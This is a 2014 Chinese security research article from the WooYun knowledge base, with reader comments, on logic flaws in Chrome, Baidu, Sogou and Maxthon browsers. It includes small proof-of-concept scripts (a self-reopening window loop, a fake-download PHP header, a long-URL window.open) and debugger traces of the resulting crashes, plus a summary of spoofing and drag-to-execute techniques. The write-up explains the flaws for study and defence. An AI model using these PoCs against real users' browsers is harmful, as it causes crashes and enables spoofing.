@@ -1,0 +1,223 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">漏洞小总结：浏览器里那些奇怪的逻辑</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">blast</a> <span class="bull">·</span> <time title="2014/03/08 9:05" ui-time="" datetime="2014/03/08 9:05" class="published ng-binding ng-isolate-scope">2014/03/08 9:05</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 引言</h2><hr><p>最早在几年前看到一本书《挖0day》，里面介绍了一个搜狗浏览器的漏洞--伪造网站，虽然时隔四年搜狗还是犯了同样的错误，不过那会儿俺是只知道有这个理儿，但是苦于对这个理解并不深，现在接触的时间多了，渐渐的就快要走到入门的门口了。</p><p>发生在浏览器上的两种问题经常革了程序员下班时间的命（真是抱歉……），一种是代码缺陷，一种是逻辑问题。 前面的倒还好说，写错了当然就是写错了，要敢于承认嘛。 至于后面的则是一个经常让开发人员头疼不已的问题--谁知道俺的用户脑洞会如此之大，这个事都做得出来？</p><p>受到大牛们的邀请，斗胆分享一下这些常见的逻辑问题，靠这些刷了那么多WB，也该分享分享了。我一直认为浏览器逻辑方面的漏洞挖掘，很多都是靠的脑洞；至于内核漏洞嘛，俺的修为尚浅，这方面只好靠行善积德堆起人品，要不然Fuzzer都不来帮忙，简直是令人灰心丧气。</p><p>当然不得不说我只是个捡漏子的小菜鸟，希望大牛们如果发现我哪儿写的不对的或者是在口胡的话直接糊我脸上就好。</p><h2>0x01 成因</h2><hr><p>事出有因，大致分一下类：</p><p>第一类是网页欺骗，这个大多数都是由于开发改地址栏的时机不对：比如IE里面在OnBeforeNavigate2、Navigate之后，chrome里面刚Load一个地址就开始换地址等等。 由于此时网页尚未加载，很多浏览器干脆就把内容页置为about:blank，而about:blank根据规则是和父窗口同源的，那父窗口当然是可以在里面为所欲为了。地址栏和内容都可以控制，那么这就是一个完美的Spoof了。</p><p>第二类是拒绝服务，这个发生原因多种多样，大多数都是浏览器自己实现的部分，由于浏览器显示的内容多种多样，页面乱七八糟的啥都有，经常一个指针没判空就崩了（百度）；或者是标题过长，或者是内存占用过多，导致程序分配不了内存然后崩溃（单进程的FireFox, <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-036684">WooYun: Firefox 23.0.1处理标签内存溢出拒绝服务漏洞</a> ）；</p><p>第三类是规则匹配不完善，这个不常见，但是俺骗来乌云的邀请码确实就是用了Mozilla官方的这个插件的正则问题导致的拒绝服务（Firefox的IETab, <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-018537">WooYun: 火狐浏览器的网银支付助手规则问题可能导致拒绝服务</a> ）。</p><p>第四类是未预期的用户行为，用户是一个群体，百万千万级别的用户的脑洞简直可以把宇宙都吸进去，用户会在浏览器上干出任何开发无法想象的到的事情，这种漏洞一般在百度搜索：浏览器 打开 崩溃，然后勾选最近1个月即可发现；</p><p>第五类是自有协议下的问题，有些浏览器为了安全构造了自有协议，因为这个就能很方便的和http/https这类不同源，脱离低级趣味了，然后浏览器会开心的放一些重要、敏感的内容进去，如果此类协议下后院起火，带来的威胁是相当之大的。</p><p>等等，因为实在是整理不完，甚至可以想象曾经浏览器的搜索栏出过问题（傲游），开一个长于MAX_PATH的本地地址浏览器溢出了（Midori），表格调整一下位置也崩溃了（IE9），replace一下浏览器地址然后全进程崩了（傲游， <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-027807">WooYun: 傲游浏览器4.1.0.300远程拒绝服务漏洞</a> ），fuzzer里面跑的页面元素刷新的太快结果浏览器HANG了整个桌面，让你鼠标有如点在空气上（360， http://www.wooyun.org/bugs/wooyun-2013-018856/trace/fd2dfb345ecc38042e4c6dbaba76fdd9）甚至浏览器的广告条都会被人爆菊花，让人觉得这个世界的恶意简直全部集中在浏览器上了，只要你脑洞够大，绝对是可以发现里面的惊奇的。</p><h2>0x03 案例</h2><hr><p>从简单到稍稍复杂看一些例子。</p><h3>0x03a chrome相对路径dos（协议处理不当）</h3><p>理论上说，代码和逻辑嵌套的越深，越容易出问题，不过这个问题倒不是这个引起的。前些天在测试一个嵌套代码的时候，就发现了测试机器上的浏览器出现了一个很奇怪的症状：打开某某chrome内核的浏览器之后，在嵌套的窗口中通过脚本执行<code>location.href="me:blablablast"</code>之后，居然出现了cpu占用100%的情况。 继而我又惊奇的发现包括v31以下版本的chrome都有这个问题（BUG 346132），为了方便查看，我把location.href换成了window.open（），这一下看到了一个好玩的现象：</p><p>我的代码是：</p><pre><code>#!html
+&lt;script&gt;
+   var k=1;
+   window.open("data:text/html, &lt;scri"+"pt&gt;var k=1111;window.open('window.open(\\\"about:blank\\\")')&lt;/scrip"+"t&gt;"+"&lt;/scrip"+"t&gt;","lll");
+&lt;/script&gt;
+</code></pre><p>理应最不济也是按照这个方式弹出窗口，最多只有4个：</p><pre><code>window1: data:text/html, &lt;script&gt;...&lt;/script&gt;
+window2: javascript:window.open('window.open(\"about:blank\")')
+window3: javascript:window.open("about:blank")
+window4: about:blank
+</code></pre><p>可是没想到从第二个窗口开始，它就无情的弹出了：</p><pre><code>window1: data:text/html, &lt;script&gt;...&lt;/script&gt;
+window2: data:text/html, &lt;script&gt;...&lt;/window.open("about:blank")
+window3: data:text/html, &lt;script&gt;...&lt;/window.open("about:blank")
+....
+</code></pre><p>正是如此，由于阴差阳错我忘了加<code>javascript:</code>，但是不巧Chrome也错把<code>window.open()</code>这个当作了相对路径，更不巧的是它居然搜索到了第二个正斜线/处，并把它后面的内容替换成了<code>window.open</code>。</p><p>这也就意味着，从window2开始，他就开始了一直执行同一段代码的不归路，难怪会一直占100%cpu呢。</p><p>官方的修复是（REV 168294）：</p><pre><code>   M http://src.chromium.org/viewvc/chrome/trunk/src/url/url_canon_relative.cc?r1=254565&amp;r2=254564&amp;pathrev=254565
+   M http://src.chromium.org/viewvc/chrome/trunk/src/url/url_canon_unittest.cc?r1=254565&amp;r2=254564&amp;pathrev=254565
+
+url_cannon_relative.cc:  +
+124      if (!is_base_hierarchical) {
+125                  // Don't allow relative URLs if the base scheme doesn't support it.
+126                  return false;
+127                }
+</code></pre><h3>0x03b 百度浏览器下载dos （特殊情况考虑不完善）</h3><p>HTTP头中，Content-Length可以反映这个请求的实体大小<code>[2]</code>，正是如此，下载的时候，下载器可以拿它当个参考，但是HTTP头是我们可以随便定义的，如果我们在服务器上做一个假的下载文件，并且把它的大小指定的非常大，甚至超出硬盘能受得了的大小，或者超出存储下载文件有多大的那个变量的上限会如何呢？</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-037842">WooYun: 百度浏览器5.0正式版除以零异常永久性拒绝服务</a></p><p>在老版本的百度浏览器中访问此文件：</p><pre><code>#!php
+&lt;?php
+    header("Content-type: application/octet-stream");    //返回的文件    
+    header("Accept-Ranges: bytes");            //按照字节大小返回
+    header("Accept-Length: 500");    //返回文件大小
+    header("Content-Length: 500");    //返回文件大小
+    header("Content-Disposition: attachment; filename=B");//这里客户端的弹出对话框，对应的文件名
+?&gt;
+</code></pre><p>当将Accept-Length该成一个超过其unsigned long上限的值时，百度浏览器简单的把其大小修改为了0。</p><p>关键是，这个0会在之后被用作计算百分比的分母，于是一个奇葩的现象就会出现：除以0错误。</p><p>过程就是如此简单：</p><pre><code>xnet!AcquireAsynHttpService+0x278f2:
+5bc5b502 83d800          sbb     eax,0
+5bc5b505 8944241c        mov     dword ptr [esp+1Ch],eax
+5bc5b509 89542418        mov     dword ptr [esp+18h],edx
+5bc5b50d 0bc0            or      eax,eax
+5bc5b50f 7518            jne     xnet!AcquireAsynHttpService+0x27919 (5bc5b529)
+5bc5b511 8b4c2418        mov     ecx,dword ptr [esp+18h] ;文件大小
+5bc5b515 8b442414        mov     eax,dword ptr [esp+14h] ;已经下载的大小
+5bc5b519 33d2            xor     edx,edx
+xnet!AcquireAsynHttpService+0x2790b:
+5bc5b51b f7f1            div     eax,ecx  ; 0/0
+
+;部分寄存器此时的值:
+;eax=00000000 ebx=00000000 ecx=00000000 edx=00000000
+
+5bc5b51d 8bd8            mov     ebx,eax
+5bc5b51f 8b442410        mov     eax,dword ptr [esp+10h]
+5bc5b523 f7f1            div     eax,ecx
+……
+</code></pre><p>5.x版本的浏览器的dmp简单查看一下：</p><pre><code>0:033&gt; !analyze -v
+FAULTING_IP: 
+xnet!AcquireAsynHttpService+2790b
+5bc5b51b f7f1            div     eax,ecx
+
+……（略）
+DEFAULT_BUCKET_ID:  STATUS_INTEGER_DIVIDE_BY_ZERO
+PRIMARY_PROBLEM_CLASS:  STATUS_INTEGER_DIVIDE_BY_ZERO
+BUGCHECK_STR:  APPLICATION_FAULT_STATUS_INTEGER_DIVIDE_BY_ZERO
+LAST_CONTROL_TRANSFER:  from 5bc25b4e to 5bc5b51b
+STACK_TEXT:  
+0a67f95c 5bc25b4e 03684b20 666e1dbf 0383c019 xnet!AcquireAsynHttpService+0x2790b
+0a67f984 5bc24817 00000000 00000000 03707e68 xnet+0x25b4e
+0a67f9ac 5bc21581 00000000 666e1dbf 00000000 xnet+0x24817
+……（略）
+</code></pre><h3>0x03c 百度浏览器堆损坏 （系统因素考虑不当）</h3><p>由于分给一个程序的栈的大小是有限的，而Chrome接受的URL长度确实无限的，所以为了方便，短url确实可以存在栈中，但是如果url的长度长于一定限度的时候，存到堆里也未尝不可，但是测试一定要完善，依然是百度浏览器5.x的一个问题：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-036295">WooYun: 百度浏览器5.0正式版(2.200.0.41563)拒绝服务漏洞</a></p><p>（为了防止一大片都是乱七八糟的数据，以下能省的我全部省略了）</p><p>这个可以很明显的显示出来老版本代码搬到新版本来的弊端，以及需要达到一定条件下才触发的漏洞点。漏洞需要：Windows Vista以上，使用主板本4.x以下或 5.0版内核版本2.2.210.42889以下的均可触发。</p><p>之前以为是像错误所报一样是BUFFER OVERRUN也就是缓冲区溢出，其实不然，这个是一个奇怪的堆破坏漏洞。</p><p>为了防止堆出现奇怪的调试器友好现象，先运行浏览器，然后Attach到进程上，运行PoC，可以发现程序产生了以下异常：</p><pre><code>STATUS_STACK_BUFFER_OVERRUN encountered
+(a18.32d4): Break instruction exception - code 80000003 (first chance)
+eax=00000000 ebx=5dab3f30 ecx=76470174 edx=0973c565 esi=00000000 edi=001b7281
+eip=7646ff55 esp=0973c7ac ebp=0973c828 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+kernel32!UnhandledExceptionFilter+0x5f:
+7646ff55 cc              int     3
+</code></pre><p>回溯一下调用栈：</p><pre><code>0:025&gt; kvn
+ # ChildEBP RetAddr  Args to Child              
+00 0973c828 5d9e7789 5dab3f30 caa3800a 355c7ff5 kernel32!UnhandledExceptionFilter+0x5f (FPO: [SEH])
+WARNING: Stack unwind information not available. Following frames may be wrong.
+01 0973cb5c 5d79757b 001b7281 656c6966 00000000 bdlogicmain!BrowserLogicInit+0x198229
+02 0973e8f8 5d9deb21 0ccf0020 113d0020 001b7281 bdlogicmain+0x757b
+03 0973e91c 5d98d6fb 00000001 c3d069b2 0d1e2dc4 bdlogicmain!BrowserLogicInit+0x18f5c1
+……（略）
+</code></pre><p>查看一下第一个参数，它指向EXCEPTION_POINTERS：</p><pre><code>0:025&gt; dd 5dab3f30
+5dab3f30  5db498a0 5db498f8 5d9e7cd0 1d5be4b5
+</code></pre><p>查看一下异常相关的信息：</p><pre><code>0:025&gt; .exr 5db498a0
+ExceptionAddress: 5d79757b (bdlogicmain+0x0000757b)
+   ExceptionCode: c0000409 (Stack buffer overflow)
+  ExceptionFlags: 00000001
+NumberParameters: 0
+</code></pre><p>然后使用它的上下文记录：</p><pre><code>0:025&gt; .cxr 5db498f8
+</code></pre><p>以此为准重新回溯一下栈：</p><pre><code>0:025&gt; kv
+  *** Stack trace for last set context - .thread/.cxr resets it
+ChildEBP RetAddr  Args to Child          
+0973e8f8 5d9deb21 0ccf0020 113d0020 001b7281 bdlogicmain+0x757b
+0973e91c 5d98d6fb 00000001 c3d069b2 0d1e2dc4 bdlogicmain!BrowserLogicInit+0x18f5c1
+0973e9b8 5d98de2d 0973ea08 c3d06a26 00000000 bdlogicmain!BrowserLogicInit+0x13e19b
+……（略）
+</code></pre><p>貌似崩溃发生在<code>bdlogicmain+0x757b</code>附近，我们在这个函数开头设下断点并仔细查看一下，Let’s rock:</p><pre><code>bp bdlogicmain+0x7556
+</code></pre><p>重新打开浏览器，运行PoC，这时Debugger停在我们的断点处。我们将前后指令给u出来，得到部分函数信息：</p><pre><code>633b753d 8dbdfcefffff    lea     edi,[ebp-1004h]
+633b7543 e818fdffff      call    bdlogicmain+0x7260 (633b7260)
+633b7548 83c404          add     esp,4
+633b754b 5f              pop     edi
+633b754c 85c0            test    eax,eax
+633b754e 75a3            jne     bdlogicmain+0x74f3 (633b74f3)
+633b7550 8bb56ce2ffff    mov     esi,dword ptr [ebp-1D94h]
+633b7556 56              push    esi ; 参数：size
+633b7557 8d95fcefffff    lea     edx,[ebp-1004h];这是他分配方式的分水岭：0x1004字节
+633b755d 52              push    edx  ; 参数：source
+633b755e 53              push    ebx    ;参数：dest
+633b755f ff15c4f46363    call    dword ptr [bdlogicmain!BrowserLogicInit+0x1cff64 (6363f4c4)] ; 调用函数：strncpy
+633b7565 8b4dfc          mov     ecx,dword ptr [ebp-4]
+633b7568 83c40c          add     esp,0Ch
+633b756b c6441eff00      mov     byte ptr [esi+ebx-1],0
+633b7570 5e              pop     esi
+633b7571 33cd            xor     ecx,ebp
+633b7573 33c0            xor     eax,eax
+633b7575 5b              pop     ebx
+633b7576 e823f82400      call    bdlogicmain!BrowserLogicInit+0x19783e (63606d9e)  ;崩溃在此
+633b757b 8be5            mov     esp,ebp
+633b757d 5d              pop     ebp
+633b757e c3              ret
+</code></pre><p>可以发现有一个<code>strncpy(esi/*size*/, edx/*source, 栈上的内容*/, ebx/*dest， 申请的堆*/);</code>非常可疑，而这个申请的堆则是在其类中使用new后memset成0得到的，其实之前这个memset的时候就已经set错位置了，不过我们先继续，p过+0x1cff64之后查看一下堆：</p><p>（*是我的用户名，隐掉了）</p><pre><code>0:025&gt; dd 11a20020
+11a20020  656c6966 2f2f2f3a 552f3a43 73726573
+11a20030  7061732f 71****** ******** 6b736544
+11a20040  2f706f74 41414141 41414141 41414141
+……blablabla
+0:025&gt; da 11a20020
+11a20020  "file:///C:/Users/**********/Desk"
+11a20040  "top/AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+11a20060  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+……blablabla
+</code></pre><p>果不其然，URL的完整内容被复制到堆中了，仔细一看却不是这儿堆溢出了，而是它初始化的问题导致复制错位了。下面是我重新开的一个实例，地址稍有变化，不过不影响结果。Strncpy完毕之后，各寄存器值如下：</p><pre><code>eax=00000000 ebx=001b7281 ecx=0006dca0 edx=0975db50 esi=0975db50 edi=11d50020
+eip=68542af4 esp=0975cd9c ebp=0975eb54 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
+MSVCR100!strncpy+0x24:
+68542af4 0f8585000000    jne     MSVCR100!strncpy+0xaf (68542b7f)        [br=1]
+</code></pre><p>查看堆这个地址的信息：</p><pre><code>0:025&gt; !address 11d50020
+ ProcessParametrs 007607f0 in range 00760000 00860000
+ Environment 09e98c48 in range 09e10000 0a210000
+    11d50000 : 11d50000 - 001b8000
+                    Type     00020000 MEM_PRIVATE
+                    Protect  00000004 PAGE_READWRITE
+                    State    00001000 MEM_COMMIT
+                    Usage    RegionUsageHeap
+                    Handle   07790000
+</code></pre><p>可以看到堆的大小远大于复制的字节数，这样可能就不会是堆溢出了，让我们再看一次堆的内容：</p><pre><code>0:025&gt; gu
+eax=11d50020 ebx=11d50020 ecx=00000000 edx=00414141 esi=001b7281 edi=001b7281
+eip=63617565 esp=0975cdac ebp=0975eb54 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+bdlogicmain+0x7565:
+63617565 8b4dfc          mov     ecx,dword ptr [ebp-4] ss:002b:0975eb50=a7babf41
+0:025&gt; dd 11d50020
+11d50020  656c6966 2f2f2f3a 552f3a43 73726573
+11d50030  7061732f 71****** ******** 6b736544
+11d50040  2f706f74 41414141 41414141 41414141
+11d50050  41414141 41414141 41414141 41414141
+</code></pre><p>接着查看一下11d50000处的堆信息，这回我们看到了好玩的东西了，从0x20字节开始，网址居然被写到了堆头部的&#95;HEAP结构，直接覆盖了堆的信息！（其实最开始memset的时候就已经盖了，new之后传来的指针就没给对），这样当堆释放的时候系统就会检测到这个问题，然后报告BUFFER&#95;OVERRUN，但其实只是一个巧合。</p><p>由于系统差异，导致函数的走向分支出现了问题，指针的偏移没有正确的写入，在Windows XP之下，偏移被正确的调整了，但是在高版本系统中这个偏移量却没有写对，导致了它直接写到了堆头部，直接破坏了整个堆的结构。</p><pre><code>0:025&gt; dt _HEAP 11d50000
+ntdll!_HEAP
+   +0x000 Entry            : _HEAP_ENTRY
+   +0x008 SegmentSignature : 0
+   +0x00c SegmentFlags     : 0
+   +0x010 SegmentListEntry : _LIST_ENTRY [ 0x1b8000 - 0x1b8000 ]
+   +0x018 Heap             : 0x213b4097 _HEAP
+   +0x01c BaseAddress      : 0x04000000 
+   +0x020 NumberOfPages    : 0x656c6966
+   +0x024 FirstEntry       : 0x2f2f2f3a _HEAP_ENTRY
+   +0x028 LastValidEntry   : 0x552f3a43 _HEAP_ENTRY
+   +0x02c NumberOfUnCommittedPages : 0x73726573
+   +0x030 NumberOfUnCommittedRanges : 0x7061732f
+   +0x034 SegmentAllocatorBackTraceIndex : 0x****
+   +0x036 Reserved         : 0x****
+   +0x038 UCRSegmentList   : _LIST_ENTRY [ 0x******** - 0x6b736544 ]
+   +0x040 Flags            : 0x2f706f74
+   +0x044 ForceFlags       : 0x41414141
+   +0x048 CompatibilityFlags : 0x41414141
+   +0x04c EncodeFlagMask   : 0x41414141
+   +0x050 Encoding         : _HEAP_ENTRY
+   +0x058 PointerKey       : 0x41414141
+   +0x05c Interceptor      : 0x41414141
+…………blabla 后面都是0x41414141
+</code></pre><p>那为什么只会在这样的PoC中出现呢，普通的window.open为什么没有这类问题？<code>bp bdlogicmain+0x7490</code> 在函数开头下断，可以发现原因是百度浏览器使用了一个逻辑，也即&lt;4096的用栈上变量，如果长于4096字节，程序才会试图分配堆并对堆进行错误的写入操作。这个问题出现在新窗口的弹出中，必须是新小窗口才会出现，包括被广告拦截也会出现。</p><p>相关问题点：</p><pre><code>636174e7 e874fcffff      call    bdlogicmain+0x7160 (63617160)  
+;函数功能：判断是否要比4096长
+636174ec 83c41c          add     esp,1Ch
+636174ef 85c0            test    eax,eax
+;eax==0 : 代表长于4096字节
+636174f1 7413            je      bdlogicmain+0x7506 (63617506)
+
+bdlogicmain+0x74f3:
+636174f3 5e              pop     esi
+636174f4 83c8ff          or      eax,0FFFFFFFFh
+636174f7 5b              pop     ebx
+636174f8 8b4dfc          mov     ecx,dword ptr [ebp-4]
+636174fb 33cd            xor     ecx,ebp
+636174fd e89cf82400      call    bdlogicmain!BrowserLogicInit+0x19783e (63866d9e)
+63617502 8be5            mov     esp,ebp
+63617504 5d              pop     ebp
+63617505 c3              ret
+
+bdlogicmain+0x7506:
+63617506 8db570e2ffff    lea     esi,[ebp-1D90h]
+6361750c 8d85fcefffff    lea     eax,[ebp-1004h]
+63617512 e8d9f9ffff      call    bdlogicmain+0x6ef0 (63616ef0)
+63617517 85c0            test    eax,eax
+63617519 75d8            jne     bdlogicmain+0x74f3 (636174f3)
+……blabla
+
+bdlogicmain+0x7550: //长于4096字节时:
+63617550 8bb56ce2ffff    mov     esi,dword ptr [ebp-1D94h]
+63617556 56              push    esi
+63617557 8d95fcefffff    lea     edx,[ebp-1004h]
+6361755d 52              push    edx
+6361755e 53              push    ebx
+6361755f ff15c4f48963    call    dword ptr [bdlogicmain!BrowserLogicInit+0x1cff64 (6389f4c4)]
+63617565 8b4dfc          mov     ecx,dword ptr [ebp-4]
+</code></pre><p>Simple PoC:</p><pre><code>#!html
+&lt;script&gt;
+var s="A";
+var i=1;
+for(i=1;i&lt;599559;i++)
+s+="A";
+
+alert(1);
+window.open(s);
+
+&lt;/script&gt;
+</code></pre><h3>0x03d 新窗口的那些事儿 （逻辑安全不全面）</h3><p>很多厂商都意识到了一个问题，那就是OnBeforeNavigate2的时候，刚chrome.Load()千万不能改地址栏啊，一定不能改地址栏啊，必须等页面全部加载完才可以，结果主窗口做的天衣无缝，完美无瑕，之后就忘了小窗口的事情。 小窗口怎么产生呢？</p><pre><code>window.open
+</code></pre><p>这个简单无比，到处可见此类弹窗小广告，被广告拦截的几率非常大，可以忽视</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-034463">WooYun: 傲游浏览器4.1.2.2000伪造任意网站漏洞</a></p><p>target 但是这个基本就没人拦了，但是蛋疼的是带有url变化的东西都能接上这个，比如anchor，比如form，这个可以参考：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-051859">WooYun: 傲游浏览器4.3.0.100 表单请求伪造网站漏洞（可钓鱼）</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-041721">WooYun: 搜狗浏览器4.2.2.9903任意网站伪造＋自有协议下XSS*2</a></p><p>厂商也意识到了，是啊，不加载完不能换地址，一定要到OnDocumentComplete，要到documentComplete()才行，可是唯独忘了程序创建新窗口的时候也不能把地址栏给设置上，这样就导致了很多问题。</p><p>因为攻击者弹出来的东西可能并不会去瞎加载一些乱七八糟的网站，他们转而可能在小窗口上运行脚本，脚本执行完之后确实产生了页面完成事件，“但是在这上面执行的javascript:开头的地址肯定是不能替换当前地址的呀，那么还是保持之前的地址好了”，这个逻辑仿佛就是“现在我做的事不对，那么前面做的事一定是正确的”，结果正中攻击者下怀，脏数据写到了页面上，脏地址倒也被当作正确地址留下来了。</p><h3>0x03e xss导致的更严重的问题 （插件安全不全面）</h3><p>越来越多的浏览器做了插件，可以让用户自行选择，这是个好事情，因为这样不必让本来只想找个小菜刀做饭的用户一下背了一个核弹发射场回家。大厂商转而大度的把装备扔自己网站上，大家是要杀人越货还是要干什么，尽管自取。</p><p>那么浏览器怎么知道用户啥时候要对自己来一发火箭炮？External接口倒是可以满足浏览器这个需求，通过设置可信域，通常就是浏览器自己的插件页地址或者官网，浏览器只在可信域上开放external接口，这样用户就能在厂商那找到并让浏览器安装各个插件了。</p><p>但是至少不要来XSS，XSS的奇技淫巧大家掌握的比我多，本来自有协议就跟个核弹发射按钮似的，这XSS一来，直接就把老家送人了，最可怕的是有些浏览器甚至自行关掉了XSS过滤器，导致攻击者只需要做一个payload放到url里就可以让这些权限高的external调用随意的在浏览器里面跑起来。</p><p>例如：</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-037211">WooYun: 搜狗浏览器远程命令执行漏洞</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-08308">WooYun: 360极速安全浏览器存在设计缺陷可导致一序列安全问题</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-052139">WooYun: 傲游4.3.0.300提示安装任意插件暴露external接口</a></p><h3>0x03f 拖拽跨域 （用户行为猜测不全）</h3><p>一直要用最坏的打算来推测用户能干出来什么出格事儿，这是个事实，之前白帽子爱梅小礼发的拖拽跨域就是个非常一针见血的证明。</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-041801">WooYun: 所有国产浏览器拖曳跨特权域漏洞</a></p><p>本来浏览器的超级拖拽行为只有仨考虑：如果是网址，那么我们就把它打开；如果是文字我们就把它转到搜索里面；如果是图片，我们就开个新窗口让用户自己放大缩小看图片。 万万没想到，还有javascript:和vbscript:这种东西。用户的鼠标可不听使唤，iframe里面一个javascript拖到外面的页面里面，脚本可就在外面执行起来了。</p><p>当然，我想着这还不是最猥琐的，这种出其不意的事情，必然有其他地方也能让我们举一反三：标签栏。</p><p>试想标签栏在开发的眼里意味着什么？无非两种可能，来的是文字，咱搜索；来的是URL，咱打开。</p><p>来的是脚本，那就执行了吧。</p><h2>0x04 预防&amp;总结</h2><hr><p>大部分还是从开发的角度来说吧，一定要在页面加载完之后再改变地址，新窗口将地址栏置为about:blank，并在页面有实际的加载之后再改地址；</p><p>在刚启动就自动执行的任务一定要保证更严格的可用性，以及要养成良好的编码习惯，释放，引用指针之前一定要确保指针有效，这样可以确保程序不会一启动或者每次做的动作大一点就完全崩溃了；</p><p>至于逻辑问题，我觉得这也只好听天由命，自求多福了，只好恳请用户大老爷手下留情，点鼠标慢一点，没事干不要乱拖乱点好了……</p><p>参考资料 [1] http://www.w3.org/TR/2008/WD-html5-20080610/web-browsers.html [2] http://tools.ietf.org/html/rfc2616#section-14.13 [3] 《挖0day》，爱无言； 应该就是他：http://www.wooyun.org/whitehats/%E7%88%B1%E6%97%A0%E8%A8%80 [4] http://illmatics.com/Understanding&#95;the&#95;LFH.pdf</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/346" rel="bookmark" id="re1">终端机的安全性</a></li><li><a href="http://drops.wooyun.org/papers/345" rel="bookmark" id="re2">在线支付逻辑漏洞总结</a></li><li><a href="http://drops.wooyun.org/web/3295" rel="bookmark" id="re3">密码找回功能可能存在的问题（补充）</a></li><li><a href="http://drops.wooyun.org/web/5048" rel="bookmark" id="re4">密码找回逻辑漏洞总结</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">爱梅小礼</span> <span class="reply-time">2015-06-25 10:39:18</span></div><p></p><p>最后这个WooYun: 所有国产浏览器拖曳跨特权域漏洞 有个点当时想留着就没写。就是在iframe里拖曳出来的js，拖曳到parent window释放的时候，是在parent里执行的权限，不管iframe和parent是不是同源</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lixupeng</span> <span class="reply-time">2014-03-28 23:01:57</span></div><p></p><p>挺好 收下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">blast</span> <span class="reply-time">2014-03-10 09:28:50</span></div><p></p><p>用看起来最顺眼最酷炫的就好了!-v-</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">blast</span> <span class="reply-time">2014-03-10 09:28:09</span></div><p></p><p>浏览器是一个汇集了全人类恶意的物体-v-</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">熊猫</span> <span class="reply-time">2014-03-09 20:49:56</span></div><p></p><p>0 0 那我应该用什么浏览器</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-03-08 19:36:07</span></div><p></p><p>看完深刻觉得写浏览器是一跳不归路。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-03-08 14:39:15</span></div><p></p><p>帅爆了，学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-03-08 12:25:52</span></div><p></p><p>很好哈</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Coffee</span> <span class="reply-time">2014-03-08 10:02:13</span></div><p></p><p>大爱大神们的总结帖～学习了。</p><p></p></div></div></div></div></div></main>
